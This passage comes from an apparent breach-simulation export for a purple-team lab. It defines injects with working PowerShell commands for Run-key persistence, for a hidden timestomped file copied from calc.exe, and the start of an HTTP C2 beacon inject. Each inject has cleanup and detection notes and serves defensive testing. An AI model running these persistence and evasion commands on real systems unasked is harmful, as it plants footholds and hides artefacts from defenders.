+   "inject_id": "6ab2ad67-abf7-50a1-a10a-d42833ec92c8",
+   "inject_title": "Persistence — HKCU Run key (T1547.001)",
+   "inject_description": "Mirrors `wld lab persist` on Windows: adds an HKCU ...\\Run value named WETLAND-LAB (harmless), removed on cleanup. Detection: `reg query HKCU\\...\\Run`; Sysmon event 13.",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
+   "inject_depends_duration": 120,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "Persistence (Run key)",
+      "fr": "Persistence (Run key)"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "26ab473f-4fc6-570b-9aaa-1510da782b52",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "4817d1de-b9bd-5206-993e-f1dfbdb45368",
+    "injector_contract_labels": {
+     "en": "Persistence (Run key)",
+     "fr": "Persistence (Run key)"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Persistence (Run key)\",\"fr\":\"Persistence (Run key)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"26ab473f-4fc6-570b-9aaa-1510da782b52\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "981e31e9-0ca4-539d-903e-28fa961b3ca1",
+     "payload_type": "Command",
+     "payload_name": "wetland — Persistence (Run key)",
+     "payload_description": "Mirrors `wld lab persist` on Windows: adds an HKCU ...\\Run value named WETLAND-LAB (harmless), removed on cleanup. Detection: `reg query HKCU\\...\\Run`; Sysmon event 13.",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": "psh",
+     "payload_cleanup_command": "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WETLAND-LAB' -ErrorAction SilentlyContinue\nWrite-Output 'WETLAND-LAB persist[run-key]: cleaned'\n",
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "82e0560c-505a-5ddc-ac8b-854233caa275",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\nNew-ItemProperty -Path $k -Name 'WETLAND-LAB' -Value 'cmd /c echo WETLAND-LAB heartbeat' -PropertyType String -Force | Out-Null\nWrite-Output 'WETLAND-LAB persist[run-key]: set HKCU\\...\\Run\\WETLAND-LAB (T1547.001)'\nWrite-Output 'detect: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ; Sysmon 13'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "e6e6e868-5110-5a1c-a6a1-364711843c91",
+      "attack_pattern_name": "Registry Run Keys / Startup Folder",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1547.001",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "26ab473f-4fc6-570b-9aaa-1510da782b52",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  },
+  {
+   "inject_id": "0aabebf3-23a7-541c-b4c2-7ca57761e150",
+   "inject_title": "Defense Evasion — hidden file + timestomp (T1564.001 / T1070.006)",
+   "inject_description": "Mirrors `wld lab hide` on Windows: drops a hidden file in %APPDATA% and copies timestamps from a system DLL (creation/last-write). Cleanup removes it. Detection: `Get-ChildItem -Hidden $env:APPDATA`; MFT $STANDARD_INFORMATION vs $FILE_NAME time mismatch.",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
+   "inject_depends_duration": 180,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "Hidden file + timestomp",
+      "fr": "Hidden file + timestomp"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "58ba1c19-43b1-5402-bc80-586b324df144",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "d4f996d5-d812-59ee-81d9-e4af71bbe0fc",
+    "injector_contract_labels": {
+     "en": "Hidden file + timestomp",
+     "fr": "Hidden file + timestomp"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Hidden file + timestomp\",\"fr\":\"Hidden file + timestomp\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"58ba1c19-43b1-5402-bc80-586b324df144\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "ac077a4a-db08-5ddf-b6fd-f0aac21ef857",
+     "payload_type": "Command",
+     "payload_name": "wetland — Hidden file + timestomp",
+     "payload_description": "Mirrors `wld lab hide` on Windows: drops a hidden file in %APPDATA% and copies timestamps from a system DLL (creation/last-write). Cleanup removes it. Detection: `Get-ChildItem -Hidden $env:APPDATA`; MFT $STANDARD_INFORMATION vs $FILE_NAME time mismatch.",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": "psh",
+     "payload_cleanup_command": "$dst = Join-Path $env:APPDATA '.wetland-lab.bin'\nif (Test-Path $dst) { attrib -h $dst; Remove-Item $dst -Force -ErrorAction SilentlyContinue }\nWrite-Output 'WETLAND-LAB hide: cleaned'\n",
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "99c30ed6-59b4-56c3-b652-6a55f34a51c8",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$ErrorActionPreference='SilentlyContinue'\n$dst = Join-Path $env:APPDATA '.wetland-lab.bin'\nCopy-Item (Join-Path $env:SystemRoot 'System32\\calc.exe') $dst -Force\nattrib +h $dst\n$ref = Get-Item (Join-Path $env:SystemRoot 'System32\\kernel32.dll')\n$f = Get-Item $dst -Force\n$f.CreationTime=$ref.CreationTime; $f.LastWriteTime=$ref.LastWriteTime; $f.LastAccessTime=$ref.LastAccessTime\nWrite-Output \"WETLAND-LAB hide: dropped hidden $dst, timestomped from kernel32.dll (T1564.001/T1070.006)\"\nWrite-Output 'detect: Get-ChildItem -Hidden $env:APPDATA ; MFT SI vs FN timestamp mismatch'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "b2cb018c-04b8-5fa6-9881-2163a4ffebff",
+      "attack_pattern_name": "Hidden Files and Directories",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1564.001",
+      "attack_pattern_kill_chain_phases": []
+     },
+     {
+      "attack_pattern_id": "f944850e-392c-5b67-8a68-6fa8d0981114",
+      "attack_pattern_name": "Timestomp",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1070.006",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "58ba1c19-43b1-5402-bc80-586b324df144",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  },
+  {
+   "inject_id": "7bd7ad89-981c-5f9d-9f59-40ed7ce3734e",
+   "inject_title": "Command & Control — HTTP-shaped C2 beacon (T1071.001 / T1571)",
+   "inject_description": "Mirrors `wld lab beacon --as http` on Windows: five jittered outbound check-ins shaped as HTTP GET with a fixed browser User-Agent. EDIT the $C2 line to your wetland relay/tunnel host:port. Detection: beaconing regularity, fixed UA, low bytes-up/down (NetFlow/Zeek).",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
